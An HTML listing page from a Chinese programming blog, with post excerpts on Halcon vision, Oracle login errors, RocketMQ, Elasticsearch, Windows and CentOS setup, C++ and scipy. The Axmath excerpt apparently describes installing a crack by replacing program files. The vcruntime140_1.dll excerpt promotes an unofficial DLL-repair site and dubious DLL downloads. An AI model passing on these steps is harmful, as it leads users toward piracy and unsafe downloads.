<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d38d635d149e4c6a01ddf305a9696a1/" rel="bookmark">
			Halcon_blob分析_形态学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基本理论 1.定义：以像素的灰度值作为分析单位 团块分析 像素颗粒分析
适应条件：光照稳定 干扰少 对比度明显
基本流程：采集--》预处理（ROI 去噪 几何变换 拉开对比度）-》分割（二值化 形态学 特征选 择）-》计算显示
二值化：根据灰度值范围将像素分为两部分的过程二值化 这个灰度范围值叫做阈值
区域：像素的集合
灰度直方图：对一幅图像的灰度值进行一个概率统计（像素个数）
区域形态学：
1.区域膨胀和区域闭运算是增加区域像素 区域腐蚀和区域开运算减少区域像素
2.在相同的结构元素半径下，区域膨胀比区域闭运算增加多 ，区域腐蚀比区域开运算元素减少的多
3.结构元素半径越大，增加减少的区域像素越多
4.结构元素是什么形状，区k域形态学处理后就越接近什么形状
连通域：具有4邻域或者8邻域关系的区域集合称为一个连通域 特征直方图：对区域进行特征的一个概率统计（区域个数)
颜色模型：RGB HSV(色度 饱和度 亮度)
二、算子 1.二值化算子 a.全局二值化 输入图像 输出区域 最小灰度值 最大灰度值
threshold (ImageReduced, Regions, 13, 43)
b.
binary_threshold (ImageScaled, Region, 'smooth_histo', 'light', UsedThreshold)//二值化--适合黑白分明
输入图像 输出区域 算法（大津阈值(利用求最大平法差的手法) 平滑直方图） 亮暗选择 输出阈值
c.动态阈值
输入图像 输出图像 均值
mean_image (GrayImage, ImageMean, 119, 119) //求均值滤波
输入图像1 输入图像2 输出区域 偏移值 亮暗选择
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d38d635d149e4c6a01ddf305a9696a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0da7c226a89a22daf9d22b72f95767d/" rel="bookmark">
			windows安装后oracle无法登录ORA-01031: insufficient privileges
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题现象 安装oracle后，使用sqlplus / as sysdba 发现无法登录，提示:
PS C:\Users\Administrator&gt; sqlplus / as sysdba SQL*Plus: Release 11.2.0.1.0 Production on 星期一 12月 28 00:02:39 2020 Copyright (c) 1982, 2010, Oracle. All rights reserved. ERROR: ORA-01031: insufficient privileges 经度娘提示，说是需要查看本地用户和组管理，于是乎与打开了计算机管理页面，发现没有用户和组
按照这个思路去添加用户和组，在ctrl+r运行界面，输入mmc，选择添加，发现还是无法添加
打开用户管理界面。发现根本看不了用户和组，这个时候搜到一条方案：链接: link.
即是用net localgroup命令
PS C:\Users\Administrator&gt; net localgroup ora_dba administrator /add 命令成功完成。 PS C:\Users\Administrator&gt; net localgroup ora_dba 别名 ora_dba 注释 Oracle DBA Group 成员 ------------------------------------------------------------------------------- Administrator NT AUTHORITY\SYSTEM 命令成功完成。 此时再使用sqlplus / as sysdba,发现登录就正常了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab6019f130bb3b2fc80840c54baa0a9b/" rel="bookmark">
			如何一键提取Word里面的图片？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在网上下载了一些word格式的文档，需要把其中一些图片提取出来，试用了如下方法：
1、用word另存为 右键点击word里面的图片，选择『另存为图片』，这种方法适合图片比较少的情况下，如果图片很多，需要全部提取出来，就比较麻烦了
2、使用工具提取 打开这个网站
提取Word图片 - www.strerr.com
选择docx文件，即可提取全部图片，可以支持单独导出图片和批量导出图片
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/600648bcd273830fbff7b6e41ead5df8/" rel="bookmark">
			RocketMQ的NameServer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NameServer的设计：
(1)NameServer互相独立，彼此没有通信关系，单台NameServer挂掉，不影响其他NameServer。
(2) NameServer不去连接别的机器，不主动推消息。
(3)单个Broker (Master、Slave)与所有NameServer进行定时注册，以便告知NameServer自己还活着。
Broker每隔30秒向所有NameServer发送心跳，心跳包含了自身的topic配置信息。
NameServer每隔10秒，扫描所有还存活的broker连接,如果某个连接的最后更新时间
与当前时间差值超过2分钟，则断开此连接，NameServer也会断开此broker下所有与slave的连接。同时更新topic与队列的对应关系，但不通知生产者和消费者。
Broker slave同步或者异步从Broker master上拷贝数据。
(4)Consumer随机与一个NameServer建立长连接，如果该NameServer断开，则从NameServer列表中查找下一个进行连接。
Consumer主要从NameServer中根据Topic查询Broker的地址，查到就会缓存到客户端，并向提供Topic服务的Master、Slave建立长连接，且定时向Master、Slave发送心跳。
如果Broker宕机，则NameServer 会将其剔除，而Consumer端的定时任务MQClientInstance.this.updateTopicRouteInfoFromNameserver每30秒执行一次，将Topic对应的Broker地址拉取下来，此地址只有Slave地址了，此时Consumer从Slave上消费。
消费者与Master和Slave都建有连接，在不同场景有不同的消费规则。
(5)Producer随机与一个NameServer建立长连接，每隔30秒(此处时间可配置)从NameServer获取Topic的最新队列情况，如果某个Broker Master宕机，Producer最多30秒才能感知，在这个期间，发往该broker master的消息失败。Producer向提供Topic服务的Master建立长连接，且定时向Master发送心跳。
生产者与所有的master连接，但不能向slave写入。
客户端是先从NameServer寻址的，得到可用Broker的IP和端口信息，然后据此信息连接broker。
综上所述，NameServer在RocketMQ中的作用：
(1)NameServer用来保存活跃的broker列表，包括Master和Slave。
(2)NameServer用来保存所有topic和该topic 所有队列的列表。
(3)NameServer用来保存所有broker的Filter 列表。
(4)命名服务器为客户端，包括生产者,消费者和命令行客户端提供最新的路由信息。
RocketMQ为什么不使用ZooKeeper而自己开发NameServer？
在服务发现领域，ZooKeeper 根本就不能算是最佳的选择。
(1)注册中心是CP还是AP系统？
在分布式系统中，即使是对等部署的服务，因为请求到达的时间，硬件的状态，操作系统的调度，虚拟机的GC等，任何一个时间点，这些对等部署的节点状态也不可能完全一致，而流量不一致的情况下，只要注册中心在A承诺的时间内(例如1s内)将数据收敛到一致状态(即满足最终一致)，流量将很快趋于统计学意义上的一致，所以注册中心以最终一致的模型设计在生产实践中完全可以接受。
(2)分区容忍及可用性需求分析实践中，注册中心不能因为自身的任何原因破坏服务之间本身的可连通性，这是注册中心设计应该遵循的铁律！
在CAP的权衡中，注册中心的可用性比数据强一致性更宝贵，所以整体设计更应该偏向AP，而非CP，数据不一致在可接受范围，而P下舍弃A却完全违反了注册中心不能因为自身的任何原因破坏服务本身的可连通性的原则。
(3)服务规模、容量、服务联通性
当数据中心服务规模超过一定数量，作为注册中心的ZooKeeper性能堪忧。
在服务发现和健康监测场景下，随着服务规模的增大，无论是应用频繁发布时的服务注册带来的写请求，还是刷毫秒级的服务健康状态带来的写请求，还是恨不能整个数据中心的机器或者容器皆与注册中心有长连接带来的连接压力上，ZooKeeper很快就会力不从心，而ZooKeeper的写并不是可扩展的，不可以通过加节点解决水平扩展性问题。
(4)注册中心需要持久存储和事务日志么?需要,也不需要。
在服务发现场景中，其最核心的数据——实时的健康的服务的地址列表，真的需要数据持久化么？不需要
在服务发现中，服务调用发起方更关注的是其要调用的服务的实时的地址列表和实时健康状态，每次发起调用时，并不关心要调用的服务的历史服务地址列表、过去的健康状态。
但是一个完整的生产可用的注册中心，除了服务的实时地址列表以及实时的健康状态之外，还会存储一些服务的元数据信息，例如服务的版本，分组，所在的数据中心，权重，鉴权策略信息，服务标签等元数据，这些数据需要持久化存储，并且注册中心应该提供对这些元数据的检索的能力。
(5)服务健康检查
使用ZooKeeper作为服务注册中心时，服务的健康检测绑定在了ZooKeeper对于Session的健康监测上，或者说绑定在TCP长链接活性探测上了。
ZK与服务提供者机器之间的TCP长链接活性探测正常的时候，该服务就是健康的么？答案当然是否定的！注册中心应该提供更丰富的健康监测方案，服务的健康与否的逻辑应该开放给服务提供方自己定义，而不是一刀切搞成了TCP活性检测！
健康检测的一大基本设计原则就是尽可能真实的反馈服务本身的真实健康状态，否则一个不敢被服务调用者相信的健康状态判定结果还不如没有健康检测。
(5)注册中心的容灾考虑
如果注册中心(Registry)本身完全宕机了，服务调用链路应该受到影响么？不应该受到影响。
服务调用(请求响应流)链路应该是弱依赖注册中心，必须仅在服务发布，机器上下线，服务扩缩容等必要时才依赖注册中心。
这需要注册中心仔细的设计自己提供的客户端，客户端中应该有针对注册中心服务完全不可用时做容灾的手段，例如设计客户端缓存数据机制就是行之有效的手段。另外，注册中心的健康检查机制也要仔细设计以便在这种情况不会出现诸如推空等情况的出现。
ZooKeeper的原生客户端并没有这种能力，所以利用ZooKeeper实现注册中心的时候我们一定要问自己，如果把ZooKeeper所有节点全干掉，你生产上的所有服务调用链路能不受任何影响么？
阿里巴巴是不是完全没有使用ZooKeeper？并不是。
熟悉阿里巴巴技术体系的都知道，其实阿里巴巴维护了目前国内最大规模的ZooKeeper集群，整体规模有近千台的ZooKeeper服务节点。
在粗粒度分布式锁，分布式选主，主备高可用切换等不需要高TPS支持的场景下有不可替代的作用，而这些需求往往多集中在大数据、离线任务等相关的业务领域，因为大数据领域，讲究分割数据集，并且大部分时间分任务多进程/线程并行处理这些数据集，但是总是有一些点上需要将这些任务和进程统一协调，这时候就是ZooKeeper发挥巨大作用的用武之地。
但是在交易场景交易链路上，在主业务数据存取，大规模服务发现、大规模健康监测等方面有天然的短板，应该竭力避免在这些场景下引入ZooKeeper，在阿里巴巴的生产实践中，应用对ZooKeeper申请使用的时候要进行严格的场景、容量、SLA需求的评估.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c3593729e4375e5231ad856f0dc36ba/" rel="bookmark">
			Elasticsearch 简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Elasticsearch 是一个非常强大的搜索引擎。它目前被广泛地使用于各个 IT 公司。Elasticsearch 是由 Elastic 公司创建。它的代码位于 GitHub - elastic/elasticsearch: Free and Open, Distributed, RESTful Search Engine。Elasticsearch 是一个分布式、免费和开放的搜索和分析引擎，适用于所有类型的数据，包括文本、数字、地理空间、结构化和非结构化数据。 Elasticsearch 基于 Apache Lucene 构建，并于 2010 年由 Elasticsearch N.V. 首次发布（现在称为 Elastic）。Elasticsearch 以其简单的 REST API、分布式特性、速度和可扩展性而闻名，是 Elastic Stack 的核心组件，Elastic Stack 是一组用于数据摄取、丰富、存储、分析和可视化的免费开放工具。 通常被称为 ELK Stack。Elastic 公司也同时拥有 Logstash 及 Kibana 开源项目。这个三个项目组合在一起，就形成了 ELK 软件栈。他们三个共同形成了一个强大的生态圈。简单地说，Logstash 负责数据的采集，处理（丰富数据，数据转换等），Kibana 负责数据展示，分析，管理，监督，警报及方案。Elasticsearch 处于最核心的位置，它可以帮我们对数据进行存储，并快速地搜索及分析数据。随着后来的 Beats 加入，ELK 软件栈，也被称为 ELKB。
事实上 Elasticsearch 的完整栈有如下的几个：
BeatsElasticsearchKibanaLogstash Beats 是一些轻量级可以允许在客户端服务器中的代理。它并不需要部署到我们的 Elastic 云中。它可以帮我们收集所有需要的事件。如果把 Beats 也纳入到我的架构中，那么 Elastic 的栈可以表述为：
在上面是一个典型的运用 Elastic Stack 的架构。我们通常不会在客户端直接调用 Elasticsearch 的 REST 接口。取而代之的是，我们使用一个 Search Service 作为中间接口。Search Service 再向 Elasticsearch 发送请求。我们可以通过 Beats 来采集 service 的日志及指标信息，我们甚至可以使用 Elastic Stack 所提供的 APM （应用性能监控）来监控应用及服务的性能并调优。Beats 所收集的信息，我们可以直接发送至 Elasticsearch，也可以发送至 Logstash 对数据做更进一步的加工（丰富，转换，删除，结构化等）再发送至 Elasticsearch。我们可以通过 Kibana 对数据进行可视化，分析，管理，对服务进行监控等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c3593729e4375e5231ad856f0dc36ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4127fd555a75b35a5a2208ea1e20a727/" rel="bookmark">
			Windows命令行初步：更改配色、提示符以及编码方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 启动和退出窗口标题和提示符命令行颜色更改编码 启动和退出 按下win+R，调出运行窗口，输入cmd就可以进入命令行了。在Win10以前的系统种，如果在命令行中再输入一个cmd，就会再打开一个命令行。但最近的Win11版本中，已经默认WT作为命令行的界面，所以在命令行输入wt才会再打开一个命令行。
exit命令可以退出命令行；cls可以清屏；help可以调出帮助信息，这三个命令应该是除了help之外最基础的了。
窗口标题和提示符 通过title命令可以更改窗口标题，例如在命令行中输入
&gt;title 命令行初步 当前选项卡的标题就会编程命令行初步，立竿见影。
每次输入命令，命令前面的&gt;一般被称为提示符，这个也是可以修改的，用到的指令是prompt，其后面跟着的代码可以决定提示符的具体符号，其对照表如下
代码符号代码符号$A&amp; (与号)$B| (坚线)$C( (左括号)$D当前日期$E转义码(ASCII 码 27)$F) (右括号)$G&gt; (大于号)$HBackspace (删除前一个字符)$L&lt; (小于号)$N当前驱动器$P当前驱动器及路径$Q= (等号)$S(空格)$T当前时间$VWindows 版本号$_回车换行符$$$ (美元符号) 这些代码可以相互组合，一般默认组合是 P P PG，就是当前驱动器及路径后面跟着&gt;。如果想将其改为时间和大于号，则只需输入prompt $T$G，效果如下
&gt;prompt prompt $T$G 13:11:34.44&gt; 13:11:35.28&gt; 13:11:36.07&gt; 命令行颜色 通过color命令，可以设置命令行的前景色和背景色，其命令格式为color后加一个两位十六进制数，分别对应背景色和前景色。数值和颜色的对应关系如下
数值颜色数值颜色0黑色8灰色1蓝色9淡蓝色2绿色A淡绿色3浅绿色B淡浅绿色4红色C淡红色5紫色D淡紫色6黄色E淡黄色7白色F亮白色 效果如下
更改编码 chcp指令可以更改命令行的代码页，也即编码方式。如果不加参数，会返回当前编码的序号
&gt;chcp 活动代码页: 936 936代表GBK。UTF-8编码为65001，故输入chcp 65001便可将编码改为utf-8。很多时候命令行无法正确显示输出，都是这个原因引起的。
比如在vim中编辑一个bat脚本，内容是
@echo 你好 如果代码页为936，则运行输出的结果为
13:40:00.48&gt;test 浣犲ソ 当代码页更改为65001后，运行结果为
Active code page: 65001 13:40:32.88&gt;test 你好 若希望永久改变编码，需要修改注册表：win+r-&gt;regedit 回车-&gt;找到下面的项
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor
在右侧窗口点击右键-&gt;新建-&gt;选择“字符串值”，添加chcp 65001。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b11880c1f2401a35c847445b97b7b37/" rel="bookmark">
			CentOS7虚拟机克隆后，静态IP配置不生效并且无法重启网络服务问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.发现问题 在Linux中输入如下代码进入配置页面
vim /etc/sysconfig/network-scripts/ifcfg-ens33 里面数据很多，克隆完只需要更改如下数据即可
设置好后，查看本机IP地址：
ifconfig 我们可以发现IP地址并非我们设置好的静态IP地址，而是动态IP
重启网络服务
service network restart 可以发现，重启失败，有如下错误
2.解决问题 经过多方查阅，最终找到解决方案
查找到该台虚拟机的MAC地址
ip link show 如下就是这台虚拟机的MAC地址
记住这个MAC地址，回到配置页面
vim /etc/sysconfig/network-scripts/ifcfg-ens33 将MAC地址修改
重启虚拟机
reboot 重启网络服务
service network restart 我们可以发现，重启成功
再次查看Ip地址
IP地址已经修改成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8abe47c300b8c875eb540402c9a0c328/" rel="bookmark">
			Axmath下载安装方法详细过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载软件安装包 链接: 密码tyi2
下载安装软件 先进行解压缩
进行下面软件的常规安装
我接受后选择安装文件位置一直点击下一步即可
完成安装
找到刚才下载的文件位置
打开此文件
复制安装的同名次文件
将文件粘贴到刚才安装的文件中出现包含同名文件点击替换目标中的文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7932212ede9e63eaf527f1cc4b0ddada/" rel="bookmark">
			输出变量到文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++自学精简教程 目录(必读)
在输出变量与换行显示文章中，我们看到了如何输出变量的值到控制台屏幕（黑窗口）。
现在我们看，如何把变量的值输出到文件：
写文件类ofstream ofstream类的对象可以用来写文件。
创建ofstream类的对象 ofstream的构造函数接收一个字符串作为参数，表示要打开（如果不存在就先创建）的文件。
#include&lt;fstream&gt;//需要包含头文件引用ofstream类 //在当前目录打开一个文本文件out.txt //如果这个文件不存在就先创建它，再打开 //在VS中运行程序时，当前目录指.vcxproj文件所在的目录 ofstream fout("out.txt");//创建ofstream类的对象fout，圆括号表示调用了接收一个字符串的构造函数 输出操作符&lt;&lt; ofstream类的对象通过输出操作符&lt;&lt;来输出数据到文件里。
输出操作符 fout&lt;&lt;变量， 表示把变量的数据写入文件中。
输出操作符本身也代表了数据的流向。
完整代码 #include&lt;fstream&gt;//需要包含头文件 using namespace std; int main() {	ofstream fout("out.txt");//创建ofstream类的对象fout，圆括号表示调用了接收一个字符串的构造函数 int myAge = 18; fout &lt;&lt; myAge &lt;&lt; endl;//就像使用cout一样往文件里输出18，并输出一个换行符 double pi = 3.14159; fout &lt;&lt; pi &lt;&lt; endl; long long i = 123456789123456789; fout &lt;&lt; i &lt;&lt; endl; return 0; } 运行程序：
可以看到控制台没有任何输出（因为我们是往文件中输出的）。
在当前目录中（.vcxproj文件同目录的文件夹）生成了一个out.txt文件：
out.txt和.vcxproj文件在同一个目录 输出的文件内容：
18 3.14159 123456789123456789 下一篇：从文件读取变量的值​​​​​​​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24edfa32ce246b42e69b7edb48e2e835/" rel="bookmark">
			python数学建模--非线性规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 从线性规划到非线性规划 本系列的开篇我们介绍了线性规划 （Linear Programming） 并延伸到整数规划、0-1规划，以及相对复杂的固定费用问题、选址问题。这些问题的共同特点是，目标函数与约束条件都是线性函数。如果目标函数或约束条件中包含非线性函数，则是非线性规划。
通常，非线性问题都比线性问题复杂得多，困难得多，非线性规划也是这样。非线性规划没有统一的通用方法、算法来解决，各种方法都有特定的应用范围和适用条件。另一方面，很多非线性规划问题在实践中不能获得全局最优解，只能得到局部最优解或近似最优解。
这意味着什么？对于数学研究来说，这也许意味着存在新的课题和挑战，可以研究更有效的算法。确实如此，即便线性规划问题的研究也在不断前进，非线性规划问题的研究更是丰富多彩。但热闹是他们的，我什么也没有。
我所想到的，是数学建模学习/课程/竞赛的根本目的是什么？是掌握各种算法的推演，努力编程以实现，还是练习分析问题建立模型的能力，使用软件和工具求解问题的能力？显然是后者。可是，为什么培训课上老师讲的都是算法呢？到了例题例程，不是一带而过，就是跳步骤讲。听课时津津有味，下课了题目还是不会做，程序还是调不通。于是，...
不过，到了非线性规划这一课，我们发现老师也不再不厌其烦地讲算法了，不知道是讲不下去还是讲不过来了： 20世纪50年代，H.W.Kuhn 和 A.W.Tucker 提出了非线性规划的基本定理，为非线性规划奠定了理论基础 ；50、60 年代出现了许多解非线性规划问题的有效算法；80年代后，随着计算机技术的快速发展，非线性规划方法取得了长足进步，在信赖域法、稀疏拟牛顿法、并行计算、内点法和有限存储法等领域取得了丰硕的成果。
所以，没关系的，都一样——参见章北海文集。
这意味着什么呢？这意味着对于学习数学建模的小白，学会把问题简化为非线性规划的标准方程，学会按照本文的方法使用求解工具包的函数，才能求解非线性规划问题，才能完赛。
2. Scipy 库求解非线性规划问题 2.1 非线性规划问题的描述 首先，我们回顾线性规划问题的标准形式：
类似地，可以写出非线性规划的一般形式：
其中：x=[x1,...,xn]Tx=[x1,...,xn]T 为决策变量，f(x)f(x) 为目标函数，hj(x)hj(x) 和 gi(x)gi(x) 为约束条件。
由此可见，非线性规划问题，实际上就是带有约束条件的非线性函数优化问题。
按照我们的学习模式，非线性规划问题的建模和求解与线性规划问题是类似的，按照以下步骤进行：
问题定义，确定决策变量、目标函数和约束条件；模型构建，由问题描述建立数学方程，并转化为标准形式的数学模型；模型求解，用标准模型的优化算法对模型求解，得到优化结果。 2.2 Scipy 求解非线性规划问题的函数 Scipy 是 Python 算法库和数学工具包，包括最优化、线性代数、积分、插值、特殊函数、傅里叶变换、信号和图像处理、常微分方程求解等模块。
本文推荐和讲解使用 Scipy 工具包中的 optimize 模块求解常见的非线性规划问题。
scipy.optimize 模块中提供了多个用于非线性规划问题的方法，适用于不同类型的问题。
brent()：单变量无约束优化问题，混合使用牛顿法/二分法。
fmin()：多变量无约束优化问题，使用单纯性法，只需要利用函数值，不需要函数的导数或二阶导数。
leatsq()：非线性最小二乘问题，用于求解非线性最小二乘拟合问题。
minimize()：约束优化问题，使用拉格朗日乘子法将约束优化转化为无约束优化问题。
2.3 scipy.optimize.brent() 求解单变量无约束优化问题 非线性规划最简单的形式是一维搜索，一维搜索的常用方法是函数逼近法和区间收缩法。
brent() 函数是 SciPy.optimize 模块中求解单变量无约束优化问题最小值的首选方法。这是牛顿法和二分法的混合方法，既能保证稳定性又能快速收敛。
scipy.optimize.brent(func, args=(), brack=None, tol=1.48e-08, full_output=0, maxiter=500) optimize.brent() 的主要参数：
func: callable f(x,*args) 目标函数 f(x)f(x)，以函数形式表示，可以通过 *args 传递参数args: tuple　可选项，以 f(x,*args) 的形式将可变参数 p 传递给目标函数 f(x,p)f(x,p) 。brack: tuple　可选项，搜索算法的开始区间（不是指 x 的上下限） optimize.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24edfa32ce246b42e69b7edb48e2e835/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df9e84f4ca73932ce16688fd50b46e5d/" rel="bookmark">
			教你如何进行vcruntime140_1.dll文件下载安装，4种方法详细的安装方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天主要要跟大家说说vcruntime140_1.dll文件下载安装，其实要下载安装这个文件还是有不少方法的，只要不要慌，有的时候办法解决，首先我们要知道vcruntime140_1.dll是Microsoft Visual C++的一部分，是许多计算机程序运行所必需的。当遇到缺少或损坏此文件的情况时，我们需要下载并安装它。下面我会介绍4种vcruntime140_1.dll文件下载安装的方法，大家可以参考一下。
方法一：通过官方渠道下载Microsoft Visual C++软件 前面我们说了，这个vcruntime140_1.dll文件是属于Microsoft Visual C++的一个文件，所以我们下载这个软件，自然就会包含vcruntime140_1.dll文件
第一步：打开Microsoft官方网站下载Microsoft Visual C++软件
第二步：下载好和你系统版本一样的Microsoft Visual C++软件
第三步：选择与你的操作系统版本和位数相对应的下载选项。
第四步：点击下载按钮，保存文件至电脑。然后直接安装就可以了，等安装完了，那么vcruntime140_1.dll文件自然也就等于下载安装了vcruntime140_1.dll文件。
这种方法，大家要注意的是版本问题，这点是比较麻烦的，要看好。
方法二：通过dll修复工具来下载安装 我们也可以通过dll修复工具来进行下载安装vcruntime140_1.dll文件，会根据你电脑系统缺失了什么dll文件，然后自动的帮你进行下载安装缺失的dll文件，如果你缺失了vcruntime140_1.dll文件，那么就会自动的帮你修复vcruntime140_1.dll文件，并且下载安装。
第一步：在任意的浏览器上车俞入：dll修复.site 然后按确认Enter键就可以了
第二步：进入站点之后下载，直接使用就可以了
点击一键修复dll错误的按钮，就会自动的帮你扫描电脑系统中缺失的dll文件
第三步：等扫描完毕后，再点击修复，然后静待修复完成就可以了。
第四步：最后就是关机重启一下就能修复vcruntime140_1.dll完成。（也可以选择手动修复，在dll修复工具上，选择手动修复，然后输入vcruntime140_1.dll文件，直接查找，下载安装就可以了。）
DLL修复工具_一键修复所有dll缺失msvcp140.dll丢失的解决方法–电脑修复精灵
方法三：通过Windows更新进行修复 Windows操作系统的更新程序通常会包含缺失的系统文件，其中就包括vcruntime140_1.dll。
第一步：点击开始菜单，然后找到“设置”。
第二步：在设置窗口中，选择“更新和安全”。
第三步：在更新和安全窗口中，选择“检查更新”来搜索可用的更新。
第四步：如果有可用的更新，点击“下载并安装”来修复系统文件并获取vcruntime140_1.dll。
方法四：通过DLL下载网站获取 有许多专为提供缺失DLL文件而设的网站。这些网站往往会提供各种DLL文件的下载，包括vcruntime140_1.dll。
第一步：在搜索引擎中搜索“vcruntime140_1.dll下载”。
第二步：选择可靠的DLL下载网站，主要要找可靠的，正规的，不然很容易中电脑病毒，或者下载到广告。
第三步：在搜索栏中输入“vcruntime140_1.dll”，然后点击搜索按钮。
第四步：从结果中选择与你的操作系统版本和位数相对应的下载选项。
第五步：下载文件，并确保文件完整性和安全性，然后直接进行vcruntime140_1.dll文件的安装注册。最后一步就是win+r，调出命令窗口输入regsvr32 vcruntime140_1.dll回车完成注册就可以了。
以上就是关于如何进行vcruntime140_1.dll文件下载安装的一些相关分享，希望本文能帮助到大家，如果想了解更多，欢迎继续关注小编哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c449a2b270e53c62c5dd7fad38069690/" rel="bookmark">
			RocketMQ的Broker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Broker角色
Broker角色分为ASYNC_MASTER (异步主机)、SYNC_MASTER (同步主机)以及SLAVE (从机)。如果对消息的可靠性要求比较严格，可以采用SYNC_MASTER加SLAV E的部署方式。如果对消息可靠性要求不高，可以采用ASYNC_MASTER加ASL AVE的部署方式。如果只是测试方便，则可以选择仅ASYNC_MASTER或仅SYNC_MASTER的部署方式。
2 FlushDiskType
SYNC_FLUSH (同步刷新)相比于ASYNC_FLUSH (异步处理)会损失很多性能，但是也更可靠，所以需要根据实际的业务场景做好权衡。
3 Broker配置
参数名
默认值
说明
listenPort
10911
接受客户端连接的监听端口
namesrvAddr
null
nameServer 地址
brokerIP1
网卡的 InetAddress
当前 broker 监听的 IP
brokerIP2
跟 brokerIP1 一样
存在主从 broker 时，如果在 broker 主节点上配置了 brokerIP2 属性，
broker 从节点会连接主节点配置的 brokerIP2 进行同步
brokerName
null
broker 的名称
brokerClusterName
DefaultCluster
本 broker 所属的 Cluser 名称
brokerId
0
broker id, 0 表示 master，其他的正整数表示 slave
storePathCommitLog
$HOME/store/commitlog/
存储 commit log的路径
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c449a2b270e53c62c5dd7fad38069690/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/114ef97716913372107b10ab96ab1001/" rel="bookmark">
			计算机毕业设计ssm基于JavaWeb的宠物领养管理系统的设计与实现b98ry9 （附源码）轻松不求人
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目运行
环境配置：
Jdk1.8 + Tomcat7.0 + Mysql + HBuilderX（Webstorm也行）+ Eclispe（IntelliJ IDEA,Eclispe,MyEclispe,Sts都支持）。
项目技术：
ssm + mybatis + Maven +mysql5.7或8.0等等组成，B/S模式 + Maven管理等等。
环境需要
1.运行环境：最好是java jdk 1.8，我们在这个平台上运行的。其他版本理论上也可以。
2.IDE环境：IDEA，Eclipse,Myeclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat 7.x,8.x,9.x版本均可
4.硬件环境：windows 7/8/10 4G内存以上；或者 Mac OS；
5.是否Maven项目: 否；查看源码目录中是否包含pom.xml；若包含，则为maven项目，否则为非maven项目
6.数据库：MySql 5.7/8.0等版本均可；
毕设帮助，指导，本源码分享，调试部署(见文末) 3.4系统用例图
用例图的作用也是十分重要的，因为它设计方法较为简单，所以它是十分重要的交流工具。在系统开发设计的时候，可以直观明了的看到每个功能模块之间的联系和相互作用，在做出任何变动的时候，都能有很明确的思维导向。它就像一座大桥一样，串联了整个系统。
本次系统的用例图做出了十分明确的功能划分，在设计时可以有很好的设计思路进行设计和延展。
管理员用例图如图3-1所示。
图3-1管理员用例图
志愿者用例图如图3-2所示。
图3-2志愿者用例图
